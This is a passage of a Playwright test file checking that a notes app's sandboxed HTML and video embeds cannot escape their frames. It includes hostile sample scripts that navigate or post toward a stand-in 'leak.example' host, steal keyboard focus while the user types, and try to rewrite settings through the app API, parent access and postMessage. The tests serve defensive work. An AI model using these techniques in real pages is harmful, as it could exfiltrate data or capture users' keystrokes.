    ["the frame around it, by name", later(`window.open("https://www.youtube-nocookie.com/embed/x?leak=7", "_parent")`)],
    ["a frame inside it", `<iframe id="n"></iframe>${later(`document.getElementById("n").src = "https://www.youtube-nocookie.com/embed/y?leak=8"`)}`],
    ["a form", `<form id="f" action="https://leak.example/form" method="post" target="_top"><input name="x" value="9"></form>${later(`document.getElementById("f").submit()`)}`],
    ["hints", `<link rel="preconnect" href="https://leak.example/"><link rel="prefetch" href="https://leak.example/prefetch?x=10"><link rel="preload" as="fetch" href="https://leak.example/preload?x=11"><link rel="modulepreload" href="https://leak.example/module?x=12">${later("1")}`],
    ["a download", later(`const a = document.createElement("a"); a.href = "https://leak.example/download?x=13"; a.download = "x"; document.body.append(a); a.click()`)],
  ];
  await page.setViewportSize({ width: 1280, height: 3600 });
  await open(page, `# Leaving\n\n${embeds.map(([name, body]) => named(name, body)).join("")}end\n`);
  await expect(page.locator(".embed-below iframe")).toHaveCount(embeds.length);
  // Each has had its try: the ones still standing say so, and the ones that left are gone from their frames.
  await page.waitForTimeout(2500);

  const frames = page.frames().filter((f) => f !== page.mainFrame() && !ownFrame(f));
  expect(frames.map((f) => f.url()).filter((url) => !url.startsWith(`${shell}/embed-frame`) && url !== "about:srcdoc" && url !== "about:blank" && !url.startsWith("chrome-error:")), "no frame is anywhere but its own document, or an error").toEqual([]);
  expect(frames.filter((f) => f.url().startsWith(`${shell}/embed-frame`)).map((f) => f.url()), "the frames the app made are where it put them").toEqual(embeds.map(() => `${shell}/embed-frame`));
  expect(reached, "nothing reached a site the app frames, or any other").toEqual([]);
  expect([...new Set(asked)], "the app was asked for nothing but the empty document, as the app asked for it").toEqual(["/embed-frame"]);
  expect(new URL(page.url()).origin).toBe(app);
  expect(page.context().pages()).toHaveLength(1);
});

const STEALS = `<input id="i" autofocus><script>setInterval(() => { try { window.focus(); document.getElementById("i").focus(); } catch (err) {} }, 30);</script>`;
const stopped = (page: Page) => page.locator(".embed-below").getByRole("alert");
const read = async (page: Page, id: string) => (await perform(page, { type: "note.read", id })).text;

test("an HTML embed that takes the keyboard as it runs on opening the note is stopped before a key reaches it, and what the member types stays in the note", async ({ page }) => {
  const note = await open(page, `# Typing\n\n/html(height=80)\n~~~html\n${STEALS}\n~~~\n\nend line\n`);
  await expect(stopped(page)).toContainText("HTML was stopped: it tried to take the keyboard while you were typing.");
  await expect(page.locator(THEIR_FRAMES)).toHaveCount(0);
  await expect(editor(page)).toBeFocused();
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type("TYPED-AFTER", { delay: 20 });
  await expect.poll(() => read(page, note.id)).toContain("end line\nTYPED-AFTER");

  // Shown again, it runs again and is stopped again: it can't win by trying often.
  await stopped(page).getByRole("button", { name: "Show it again" }).click();
  await expect(stopped(page)).toBeVisible();
  await expect(page.locator(THEIR_FRAMES)).toHaveCount(0);
});

test("a frame that waits for the member to be typing elsewhere is stopped too, with every key in the note", async ({ page }) => {
  const waits = `<input id="i"><script>setTimeout(() => setInterval(() => { window.focus(); document.getElementById("i").focus(); }, 30), 1500);</script>`;
  const note = await open(page, `# Typing\n\n/html(height=80)\n~~~html\n${waits}\n~~~\n\nend line\n`);
  await expect(below(page, "html").locator("iframe")).toBeVisible();
  // The pointer passes over it and leaves, and the member goes back to the note.
  const box = (await below(page, "html").boundingBox())!;
  await page.mouse.move(box.x + 20, box.y + 20);
  await page.mouse.move(box.x + 40, box.y + 30);
  await line(page, "end line").click();
  await page.keyboard.press("End");
  const typed = "abcdefghijklmnopqrstuvwxyz0123456789".repeat(2);
  await page.keyboard.type(typed, { delay: 40 });
  await expect(stopped(page)).toBeVisible();
  await expect(page.locator(THEIR_FRAMES)).toHaveCount(0);
  await expect.poll(() => read(page, note.id)).toContain(`end line${typed}`);
});

test("a frame the member clicks into has the keyboard, and gives it back from a button or a click in the note", async ({ page }) => {
  const note = await open(page, `# Typing\n\n/html(height=80)\n~~~html\n<input id="i" aria-label="Inside">\n~~~\n\nend line\n`);
  const inside = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe").getByRole("textbox", { name: "Inside" });
  // A pointer moves before it presses, which is what lets the press through to the frame.
  const pointAt = async () => {
    const box = (await below(page, "html").boundingBox())!;
    await page.mouse.move(box.x + box.width / 2 - 5, box.y + box.height / 2 - 5);
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  };
  await pointAt();
  await inside.click();
  await page.keyboard.type("typed inside");
  await expect(inside).toHaveValue("typed inside");
  await expect(stopped(page)).toHaveCount(0);

  await below(page, "html").getByRole("button", { name: "Back to the note" }).click();
  await expect(editor(page)).toBeFocused();
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type(" typed outside");
  await expect.poll(() => read(page, note.id)).toContain("end line\n typed outside");
  await expect(below(page, "html").getByRole("button", { name: "Back to the note" })).toBeHidden();

  // In again, and out by clicking in the note. It was never stopped, and still holds what was typed in it.
  await pointAt();
  await inside.click();
  await page.keyboard.type(", twice");
  await line(page, "end line").click();
  await page.keyboard.type("!");
  await expect.poll(() => read(page, note.id)).toContain("!");
  await expect(inside).toHaveValue("typed inside, twice");
  await expect(stopped(page)).toHaveCount(0);
  await expect.poll(() => read(page, note.id)).not.toContain("typed inside");
});

test("another site's frame that takes the keyboard is stopped the same way", async ({ page }) => {
  await standIns(page);
  await page.route(`${PLAYER}**`, (route) => route.fulfill({ contentType: "text/html", body: `<body>${STEALS}` }));
  const note = await open(page, "# Video\n\nhttps://youtu.be/dQw4w9WgXcQ\n\nend line\n");
  await page.keyboard.press("ControlOrMeta+End");
  await below(page, "video").getByRole("button", { name: /^Play video/ }).click();
  await expect(stopped(page)).toContainText("Video was stopped: it tried to take the keyboard while you were typing.");
  await expect(page.locator(THEIR_FRAMES)).toHaveCount(0);
  await expect(editor(page)).toBeFocused();
  await page.keyboard.type("TYPED", { delay: 20 });
  await expect.poll(() => read(page, note.id)).toContain("TYPED");
  await stopped(page).getByRole("button", { name: "Show it again" }).click();
  await expect(below(page, "video").getByRole("button", { name: /^Play video/ })).toBeVisible();
});

test("what is below a line can write what it learned into the note, which is where its room is read from", async ({ page }) => {
  // A picture that doesn't know its size until it has loaded: it has a usual room until then, and writes the size once.
  await page.addInitScript(() => {
    const sizeIn = (config: string) => /(\d+)x(\d+)/.exec(config);
    (window as unknown as { __INK_FIXTURE_PLUGINS__: unknown[] }).__INK_FIXTURE_PLUGINS__ = [
      {
        id: "fixture",
        name: "Picture fixture",
        activate(host: { embeds: { register(embed: unknown): void } }) {
          host.embeds.register({
            name: "pic",
            title: "Picture",
            render: (el: HTMLElement) => void (el.textContent = "Picture"),
            below: {
              box({ config }: { config: string }) {
                const size = sizeIn(config);
                return { ratio: size ? Number(size[1]) / Number(size[2]) : 4 / 3 };
              },
              render(el: HTMLElement, embed: { config: string; update(next: { config: string }): void }) {
                const drawn = ((window as unknown as { drawn: string[] }).drawn ??= []);
                drawn.push(embed.config);
                const loaded = el.appendChild(document.createElement("button"));
                loaded.textContent = "It has loaded";
                loaded.addEventListener("click", () => sizeIn(embed.config) || embed.update({ config: `${embed.config} 400x100` }));
              },
            },
          });
        },
      },
    ];
  });
  const note = await open(page, "# Album\n\nabove\n\n/pic(cat)\n\nbelow\n");
  const size = async () => (await placed(page, "pic")).el!.slice(2);
  await expect(below(page, "pic")).toBeVisible();
  const usual = await size();
  expect(usual[0]! / usual[1]!).toBeCloseTo(4 / 3, 1);
  await below(page, "pic").evaluate((el: HTMLElement & { marked?: boolean }) => (el.marked = true));

  await below(page, "pic").getByRole("button", { name: "It has loaded" }).click();
  await expect.poll(() => read(page, note.id)).toBe("# Album\n\nabove\n\n/pic(cat 400x100)\n\nbelow\n");
  await expect.poll(async () => { const [width, height] = await size(); return Math.round(width! / height!); }).toBe(4);
  await expectOverItsRoom(page, "pic", "once its size is in the note");
  await expect.poll(() => below(page, "pic").evaluate((el: HTMLElement & { marked?: boolean }) => el.marked), "drawn again in the element it had").toBe(true);
  await expect.poll(() => page.evaluate(() => (window as unknown as { drawn: string[] }).drawn)).toEqual(["cat", "cat 400x100"]);
  // It is the member's edit: one step of undo takes it back, and it is in the note's history as theirs.
  await expect.poll(async () => (await perform(page, { type: "note.history", id: note.id })).map((c) => c.author.kind)).toEqual(["member", "member"]);
});

test("a playing video goes on through vim's operators, undo and redo, and plugins turned off and on", async ({ page }) => {
  test.slow();
  await page.setViewportSize({ width: 1600, height: 1000 });
  const asked = await standIns(page);
  await signInAsNewPerson(page, "Ada Lovelace");
  await perform(page, { type: "settings.write", text: JSON.stringify({ "vim.enabled": true }), baseRevision: 0 });
  const note = await perform(page, { type: "note.create", text: "# Video\n\nabove one\nabove two\nhttps://youtu.be/dQw4w9WgXcQ\nbelow one\nbelow two\n" });
  await page.goto(`/note/${note.id}`);
  await expect(page.locator(".cm-vim-panel")).toHaveText("--NORMAL--");
  await below(page, "video").getByRole("button", { name: /^Play video/ }).click();
  await expect.poll(() => player(page)?.url()).toContain("dQw4w9WgXcQ");
  // The player's own script has run, so there is a load to tell later ones from.
  await expect.poll(async () => (await playing(player(page)!)).born).toBeTruthy();
  const { born } = await playing(player(page)!);
  await watch(page, "video");
  let ticks = 0;
  const expectStillPlaying = async (when: string) => {
    await expect.poll(async () => (await playing(player(page)!)).ticks, `counting on ${when}`).toBeGreaterThan(ticks);
    const now = await playing(player(page)!);
    ticks = now.ticks;
    expect(now.born, `the same load ${when}`).toBe(born);
    expect(asked, `asked for once ${when}`).toHaveLength(1);
    await expect.poll(() => kept(page, "video"), `the same element, never moved, ${when}`).toEqual({ same: true, moves: 0 });
  };
  const toLine = async (lineNumber: number) => {
    await editor(page).focus();
    await page.keyboard.type("gg");
    for (let i = 1; i < lineNumber; i++) await page.keyboard.press("j");
  };

  await toLine(4);
  await page.keyboard.type("dd");
  await expect(editor(page)).not.toContainText("above two");
  await expectStillPlaying("after dd on the line above");
  await page.keyboard.press("u");
  await expect(editor(page)).toContainText("above two");
  await expectStillPlaying("after that was undone");
  await page.keyboard.press("Control+r");
  await expect(editor(page)).not.toContainText("above two");
  await expectStillPlaying("after it was redone");
  await page.keyboard.press("u");
  await expect(editor(page)).toContainText("above two");

  // J joins the two lines above it into one: its own line is a line higher, and it is the same video.
  await toLine(3);
  await page.keyboard.press("Shift+J");
  await expect(line(page, "above one above two")).toBeVisible();
  await expectStillPlaying("after the lines above were joined");
  await expectOverItsRoom(page, "video", "after the lines above were joined");
  await page.keyboard.press("u");
  await expectStillPlaying("after the join was undone");

  const run = async (command: string) => {
    await page.keyboard.press("ControlOrMeta+Shift+P");
    await page.getByRole("combobox", { name: "Commands" }).fill(command);
    await expect(page.getByRole("dialog", { name: "Commands" }).getByRole("option").first()).toHaveText(new RegExp(`^${command}`));
    await page.keyboard.press("Enter");
  };
  for (const command of ["Disable plugin: Word count", "Enable plugin: Word count", "Disable plugin: Vim", "Enable plugin: Vim"]) {
    await run(command);
    await expectStillPlaying(`after "${command}"`);
  }

  // Its own line deleted, it is gone. Brought back by undo it is a new one, to be played when asked.
  await expect(page.locator(".cm-vim-panel")).toHaveText("--NORMAL--");
  await toLine(5);
  await page.keyboard.type("dd");
  await expect(below(page, "video")).toHaveCount(0);
  await expect.poll(() => player(page)).toBeUndefined();
  await page.keyboard.press("u");
  await expect(below(page, "video").getByRole("button", { name: /^Play video/ })).toBeVisible();
  expect(asked).toHaveLength(1);
});

test("an HTML block's lines fold away when the cursor leaves it, which moves the lines after it, and its frame stays where its room is", async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 1200 });
  await open(page, "# Scene\n\nabove\n\n/html(height=120)\n~~~html\n<p>one</p>\n<p>two</p>\n<p>three</p>\n~~~\n\nafter the block\nand another\n");
  await expect(below(page, "html").locator("iframe")).toBeVisible();
  await settled(page);
  const top = () => line(page, "after the block").evaluate((el) => Math.round(el.getBoundingClientRect().top));
  const outside = await top();
  await goTo(page, 5);
  await expect(editor(page)).toContainText("/html(height=120)");
  await expectOverItsRoom(page, "html", "with the block shown as written");
  // Six lines as written above its card, where there were none.
  const lineHeight = await line(page, "after the block").evaluate((el) => el.getBoundingClientRect().height);
  await expect.poll(async () => (await top()) - outside).toBeGreaterThan(3 * lineHeight);
  await page.keyboard.press("ControlOrMeta+Home");
  await expect.poll(top).toBe(outside);
  await expectOverItsRoom(page, "html", "with the block folded again");
});

for (const scheme of ["light", "dark"] as const) {
  test(`an HTML embed that says nothing of colour is read in the app's own, in the ${scheme} theme, and its frame is never a white box`, async ({ page }) => {
    await page.emulateMedia({ colorScheme: scheme });
    await open(page, "# Bare\n\n/html(height=80)\n~~~html\n<b>hello</b>\n~~~\n\nlast\n");
    const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
    await expect(framed.getByText("hello")).toBeVisible();
    const colours = () => {
      const { backgroundColor, color } = getComputedStyle(document.documentElement);
      return [backgroundColor, color];
    };
    const inside = await running(page)[0]!.evaluate(colours);
    expect(inside).toEqual(await page.evaluate(colours));
    expect(inside).toEqual(scheme === "dark" ? ["rgb(23, 23, 22)", "rgb(232, 230, 227)"] : ["rgb(251, 250, 248)", "rgb(31, 30, 28)"]);
    // The document around the embed's own has no colour to show through before it, or beside it.
    await expect.poll(() => page.frames().find((f) => f.url().endsWith("/embed-frame") && !ownFrame(f))!.evaluate(() => getComputedStyle(document.body).backgroundColor)).toBe("rgba(0, 0, 0, 0)");
  });
}

test("HTML is not handed to a frame whose document came without what shuts it in, and the member is told that nothing ran", async ({ page }) => {
  // The shell as the Worker serves it, but with no policy: its origin is then the app's own, or the embeds' host's.
  await page.route("**/embed-frame", async (route) => {
    const served = await fetched(route);
    const headers = { ...served.headers() };
    delete headers["content-security-policy"];
    await route.fulfill({ response: served, headers });
  });
  await open(page, "# Open\n\n/html(height=80)\n~~~html\n<b>hello</b><script>window.ran = true;</script>\n~~~\n\nlast\n");
  await expect(below(page, "html").getByRole("alert")).toHaveText("This browser wouldn't load the frame HTML runs in, so nothing was run.", { timeout: 15_000 });
  expect(running(page)).toEqual([]);
  await expect(page.locator(THEIR_FRAMES)).toHaveCount(0);
});

test("HTML asks first where embeds have no site of their own, runs by itself once its room is on screen where they have, and the member's choice wins either way", async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 700 });
  const filler = Array.from({ length: 60 }, (_, n) => `line ${n}`).join("\n");
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  const choice = page.getByLabel("Run HTML embeds", { exact: true });
  const settings = async () => JSON.parse((await perform(page, { type: "settings.read" })).text);

  // A server with no site of HTML embeds' own, as no Preview has: a member who hasn't chosen is asked first.
  const embedSite = (site: boolean) =>
    page.route("**/api/me", async (route) => {
      const response = await route.fetch();
      await route.fulfill({ response, json: { ...(await response.json()), setup: { embedSite: site } } });
    });
  await embedSite(false);
  await open(page, "# Asked\n\n/html(height=80)\n~~~html\n<p>asked</p>\n~~~\n\nlast\n", {});
  await expect(runHtml(page)).toBeVisible();
  await settled(page);
  expect(running(page)).toEqual([]);
  await runHtml(page).click();
  await expect(framed.getByText("asked")).toBeVisible();
  // In Settings, where the option is the HTML embeds plugin's, that is the default here, and the member chooses otherwise.
  await page.goto("/settings/plugins/html");
  await expect(choice).toHaveValue("ask first");
  await expect(choice.locator("option")).toHaveText(["automatically", "ask first"]);
  await choice.selectOption("automatically");
  await expect.poll(settings).toEqual({ "html.run": "automatically" });
  const far = await perform(page, { type: "note.create", text: `# Far\n\n${filler}\n\n/html(height=80)\n~~~html\n<p>far down</p>\n~~~\n\nlast\n` });
  await page.goto(`/note/${far.id}`);
  await settled(page);
  expect(running(page), "nothing runs while its room is off screen").toEqual([]);
  await editor(page).focus();
  await page.keyboard.press("ControlOrMeta+End");
  await expect(framed.getByText("far down")).toBeVisible();
  await expect(runHtml(page)).toHaveCount(0);

  // A server whose embeds have a site of their own says so, and there a member who hasn't chosen isn't asked. Asking first is theirs to choose.
  await embedSite(true);
  await open(page, "# Apart\n\n/html(height=80)\n~~~html\n<p>apart</p>\n~~~\n\nlast\n", {});
  await expect(framed.getByText("apart")).toBeVisible();
  await expect(runHtml(page)).toHaveCount(0);
  await page.goto("/settings/plugins/html");
  await expect(choice).toHaveValue("automatically");
  await choice.selectOption("ask first");
  await expect.poll(settings).toEqual({ "html.run": "ask first" });
  const asked = await perform(page, { type: "note.create", text: "# Asked again\n\n/html(height=80)\n~~~html\n<p>asked again</p>\n~~~\n\nlast\n" });
  await page.goto(`/note/${asked.id}`);
  await expect(runHtml(page)).toBeVisible();
  await settled(page);
  expect(running(page)).toEqual([]);
});

/** Counts each time an HTML embed's shell is asked for, from here on. */
/**
 * The HTML embeds' documents asked for so far, where they are served from, and not the app's address
 * that sends them there. Common Ink's own plugins that run shut off load the same document, in frames
 * of their own name, which a frame has once it is there.
 */
async function shells(page: Page) {
  const served = await frameOrigin(page);
  const asked: Request[] = [];
  page.on("request", (request) => void (request.url() === `${served}/embed-frame` && asked.push(request)));
  return () => asked.filter((request) => request.frame().name() !== "ink-own-plugin").map((request) => request.url());
}

test("an HTML body being written runs nothing at each key: what was written runs once the cursor has left the block", async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 1200 });
  const asked = await shells(page);
  await open(page, "# Writing\n\n/html(height=80)\n~~~html\n<p>first</p>\n~~~\n\nafter\n");
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  await expect(framed.getByText("first")).toBeVisible();
  expect(asked()).toHaveLength(1);
  // Half-written, this would loop for ever: it must not run until the cursor leaves.
  await goTo(page, 5);
  await page.keyboard.type("<script>let i = 0; while (i < 3) { i }</script><p>second</p>");
  await settled(page);
  await page.waitForTimeout(300);
  expect(asked(), "nothing ran while the body was written").toHaveLength(1);
  await expect(framed.getByText("first")).toBeVisible();
  // The loop is finished (`i` becomes `i++`) before the cursor leaves: the frame and the app share a process here, so a loop that ran would stop the page answering.
  for (let n = " }</script><p>second</p>".length; n > 0; n--) await page.keyboard.press("ArrowLeft");
  await page.keyboard.type("++");
  await page.keyboard.press("ControlOrMeta+Home");
  await expect(page.locator(".cm-line").filter({ hasText: "while (i < 3)" })).toHaveCount(0);
  await expect(framed.getByText("second")).toBeVisible();
  expect(asked()).toHaveLength(2);
});

test("an HTML embed in a pane is run only once its room is in sight in that pane, not because it is inside the window", async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 1200 });
  const fill = Array.from({ length: 12 }, (_, n) => `p${n}`).join("\n\n");
  const note = await open(page, `# Split\n\nintro\n\n${fill}\n\n/html(height=60)\n~~~html\n<p>far in the pane</p>\n~~~\n\nend\n`);
  await page.goto("/");
  await page.goto(`/note/${note.id}`);
  await expect(editor(page)).toContainText("intro");
  await page.getByRole("tab").first().dblclick();
  await page.getByRole("tree", { name: "Folders" }).getByRole("treeitem", { name: "Unsorted", exact: true }).dblclick();
  await page.getByRole("tab", { name: "Unsorted" }).first().click({ button: "right" });
  await page.getByRole("menuitem", { name: "Split down", exact: true }).click();
  await expect(page.locator(".note-scroll")).toHaveCount(1);
  await settled(page);
  // The pane's own: the folder's list beside it draws the note in its card too.
  const room = page.locator(".note-scroll .embed-below-room > div");
  const clipped = await room.evaluate((el) => el.getBoundingClientRect().top > el.closest(".note-scroll")!.getBoundingClientRect().bottom);
  expect(clipped, "the room is below the pane's edge and inside the window").toBe(true);
  expect(await room.evaluate((el) => el.getBoundingClientRect().top < innerHeight)).toBe(true);
  await page.waitForTimeout(300);
  expect(running(page), "nothing runs out of sight in its pane").toEqual([]);
  await page.locator(".note-scroll").evaluate((el) => el.scrollTo(0, el.scrollHeight));
  await expect(page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe").getByText("far in the pane")).toBeVisible();
});

test("HTML that stops its own page from loading is still shown, and does not stay a placeholder", async ({ page }) => {
  await open(page, "# Stopped\n\n/html(height=80)\n~~~html\n<p>stopped early</p><script>window.stop()</script>\n~~~\n\nlast\n");
  await expect(page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe").getByText("stopped early")).toBeAttached();
  await expect(page.locator(".embed-below .embed-loading")).toHaveCount(0, { timeout: 8000 });
  await expect(below(page, "html").locator("iframe")).not.toHaveClass(/embed-arriving/);
});

test("a change to whether HTML runs by itself reaches an open note: ask first stops what ran by itself, automatically runs what was asking, and a value that isn't a choice asks", async ({ page }) => {
  await open(page, "# Follows\n\n/html(height=80)\n~~~html\n<p>following</p>\n~~~\n\nlast\n", { "html.run": "Ask first" });
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  await expect(runHtml(page)).toBeVisible();
  await settled(page);
  expect(running(page), "a value written in other letters asks").toEqual([]);
  // Changed elsewhere, as in another tab; this one reads the settings again when it is come back to.
  const write = async (text: string) => {
    const { revision } = await perform(page, { type: "settings.read" });
    await perform(page, { type: "settings.write", text, baseRevision: revision });
    await page.evaluate(() => dispatchEvent(new Event("focus")));
  };
  await write('{"html.run":"automatically"}');
  await expect(framed.getByText("following")).toBeVisible();
  await expect(runHtml(page)).toHaveCount(0);
  await write('{"html.run":"ask first"}');
  await expect(runHtml(page)).toBeVisible();
  await expect.poll(() => running(page)).toEqual([]);
  // What the member runs by pressing Run is theirs: a change of the setting leaves it running.
  await runHtml(page).click();
  await expect(framed.getByText("following")).toBeVisible();
  await write('{"html.run":"ask first","core.theme":"dark"}');
  await page.waitForTimeout(300);
  await expect(framed.getByText("following")).toBeVisible();
});

test("HTML that was running when its page stopped answering asks before it runs again, in a new tab too, and runs by itself after a page left as usual", async ({ page, context, browser, baseURL }) => {
  const note = await open(page, "# Froze\n\n/html(height=80)\n~~~html\n<p>was running</p>\n~~~\n\nlast\n");
  const framed = (p: Page) => p.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  await expect(framed(page).getByText("was running")).toBeVisible();
  // Left as usual: run again by itself.
  await page.reload();
  await expect(framed(page).getByText("was running")).toBeVisible();
  await expect(runHtml(page)).toHaveCount(0);
  // A page that stops answering is never left. What the browser keeps is then as it is now, while the HTML runs: a new tab opens on that.
  const unanswered = await browser.newContext({ baseURL, storageState: await context.storageState() });
  const again = await unanswered.newPage();
  again.on("pageerror", (err) => errors.push(err.message));
  await again.goto(`/note/${note.id}`);
  await expect(runHtml(again)).toBeVisible();
  await expect(runHtml(again)).toContainText("stopped answering");
  await settled(again);
  expect(running(again)).toEqual([]);
  await runHtml(again).click();
  await expect(framed(again).getByText("was running")).toBeVisible();
  // Run was pressed: it is no longer held against it.
  await again.reload();
  await expect(framed(again).getByText("was running")).toBeVisible();
  await expect(runHtml(again)).toHaveCount(0);
  await unanswered.close();
});

test("what an HTML embed runs can't change whether HTML runs by itself, by the server, the page around it, or anything the page keeps", async ({ page }) => {
  const tries = `<p id="out">trying</p><script>
    const tried = [];
    const attempt = async (name, run) => { try { await run(); tried.push(name + ": went"); } catch (err) { tried.push(name + ": refused"); } };
    (async () => {
      const ops = (body) => fetch("/api/me").then((r) => r.json()).then((me) => fetch("/api/workspaces/" + me.workspaces[0].id + "/ops", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }));
      await attempt("fetch", () => ops({ type: "settings.write", text: '{"html.run":"automatically"}', baseRevision: 1 }));
      await attempt("parent", () => { parent.parent.localStorage.clear(); });
      await attempt("top", () => { top.document.title = "taken"; });
      await attempt("storage", () => { localStorage.setItem("html.run", "automatically"); });
      parent.parent.postMessage({ type: "settings.write", text: '{"html.run":"automatically"}' }, "*");
      parent.parent.postMessage({ embedFrame: "ready" }, "*");
      const form = document.createElement("form");
      form.method = "post"; form.action = "/api/settings"; form.target = "_top";
      document.body.append(form);
      await attempt("form", () => form.submit());
      document.getElementById("out").textContent = "tried";
      window.tried = tried;
    })();
  </script>`;
  const note = await open(page, `# Tries\n\n/html(height=80)\n~~~html\n${tries}\n~~~\n\nlast\n`, { "html.run": "ask first" });
  await runHtml(page).click();
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  await expect(framed.locator("#out")).toHaveText("tried");
  const tried = await running(page)[0]!.evaluate(() => (window as unknown as { tried: string[] }).tried);
  expect(tried.slice(0, 3)).toEqual(["fetch: refused", "parent: refused", "top: refused"]);
  await page.waitForTimeout(500);
  expect(JSON.parse((await perform(page, { type: "settings.read" })).text)).toEqual({ "html.run": "ask first" });
  await page.goto(`/note/${note.id}`);
  await expect(runHtml(page)).toBeVisible();
  expect(await page.title()).not.toBe("taken");
});

test("a post and an HTML embed hold their room with a placeholder its size while they load, and nothing in the note moves when they arrive", async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 1400 });
  await standIns(page, { postHeight: 300 });
  const note = await open(page, "# Arriving\n\nabove\n\nhttps://x.com/jack/status/20\n\n/html(height=120)\n~~~html\n<p>Hello</p>\n~~~\n\nafter\n");
  // Seen once, so the post's height is known, as it is from the second time a post is shown.
  await expect.poll(async () => (await below(page, "post").boundingBox())?.height).toBe(300);

  await page.unrouteAll({ behavior: "ignoreErrors" });
  await standIns(page, { postHeight: 300, postDelay: 1500 });
  await page.route("**/embed-frame", async (route) => {
    await new Promise((done) => setTimeout(done, 1500));
    await route.continue();
  });
  await page.goto(`/note/${note.id}`);
  await expect(page.locator(".embed-below .embed-loading")).toHaveCount(2);
  await expect(page.locator(".embed-below iframe.embed-arriving")).toHaveCount(2);
  await page.evaluate(() => document.fonts.ready);
  await settled(page);
  const measured = () =>
    page.evaluate(() => {
      const box = (el: Element) => {
        const rect = el.getBoundingClientRect();
        return [rect.left, rect.top, rect.width, rect.height].map((n) => Math.round(n * 10) / 10);
      };
      return {
        lines: [...document.querySelectorAll(".cm-content .cm-line")].map(box),
        rooms: [...document.querySelectorAll(".embed-below-room > div")].map(box),
        shown: [...document.querySelectorAll(".embed-below")].map(box),
        placeholders: [...document.querySelectorAll(".embed-loading")].map(box),
      };
    });
  const loading = await measured();
  for (const [n, [left, top, width, height]] of loading.placeholders.entries()) {
    const [boxLeft, boxTop, boxWidth, boxHeight] = loading.shown[n]!;
    expect([left! - boxLeft!, top! - boxTop!, boxWidth! - width!, boxHeight! - height!].every((d) => d >= 0 && d <= 2), `placeholder ${n} fills its box, inside its edge: ${loading.placeholders[n]} in ${loading.shown[n]}`).toBe(true);
  }
  expect(loading.shown[0]![3], "the post's room is its height from the start").toBe(300);

  await expect(page.locator(".embed-below .embed-loading")).toHaveCount(0, { timeout: 10_000 });
  await expect(page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe").getByText("Hello")).toBeVisible();
  await settled(page);
  const arrived = await measured();
  expect({ ...arrived, placeholders: [] }, "nothing moved when they arrived").toEqual({ ...loading, placeholders: [] });
});
